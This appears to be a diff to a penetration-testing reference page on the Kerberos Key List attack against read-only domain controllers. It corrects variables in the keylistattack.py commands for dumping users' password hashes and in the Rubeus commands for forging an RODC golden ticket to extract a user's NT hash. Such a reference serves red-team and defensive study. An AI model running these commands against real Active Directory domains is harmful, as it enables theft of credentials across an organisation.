@@ -23,14 +23,14 @@ From UNIX-like systems, the [keylistattack.py](https://github.com/fortra/impacke
 ```bash
 #Attempt to dump all the users' hashes even the ones in the Denied list
 #Low privileged credentials are needed in the command for the SAMR enumeration
-keylistattack.py -rodcNo "$KBRTGT_NUMBER" -rodcKey "$KRBTGT_AES_KEY" -full "$DOMAIN"/"$USER":"$PASSWORD"@"$RODC-server"
+keylistattack.py -rodcNo "$RODC_NUMBER" -rodcKey "$KRBTGT_AES_KEY" -full "$DOMAIN"/"$USER":"$PASSWORD"@"$RODC-server"
 
 #Attempt to dump all the users' hashes but filter the ones in the Denied list
 #Low privileged credentials are needed in the command for the SAMR enumeration
-keylistattack.py -rodcNo "$KBRTGT_NUMBER" -rodcKey "$KRBTGT_AES_KEY" "$DOMAIN"/"$USER":"$PASSWORD"@"$RODC-server"
+keylistattack.py -rodcNo "$RODC_NUMBER" -rodcKey "$KRBTGT_AES_KEY" "$DOMAIN"/"$USER":"$PASSWORD"@"$RODC-server"
 
 #Attempt to dump a specific user's hash
-keylistattack.py -rodcNo "$KBRTGT_NUMBER" -rodcKey "$KRBTGT_AES_KEY" -t "$TARGETUSER" -kdc "$RODC_FQDN" LIST
+keylistattack.py -rodcNo "$RODC_NUMBER" -rodcKey "$KRBTGT_AES_KEY" -t "$TARGETUSER" -kdc "$RODC_FQDN"
 ```
 
 
@@ -41,10 +41,10 @@ From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be 
 
 ```powershell
 # 1. Forge a RODC Golden ticket
-Rubeus.exe golden /rodcNumber:$KBRTGT_NUMBER /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:$KRBTGT_AES_KEY /user:USER /id:USER_RID /domain:domain.local /sid:DOMAIN_SID
+Rubeus.exe golden /rodcNumber:$RODC_NUMBER /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:$KRBTGT_AES_KEY /user:USER /id:USER_RID /domain:$DOMAIN /sid:DOMAIN_SID
 
 # 2. Request a TGT via TGS-REQ request and retrieve the NT hash of the user in the response
-Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:ticket.kirbi /service:krbtgt/domain.local 
+Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:ticket.kirbi /service:krbtgt/$DOMAIN 
 ```
 
 
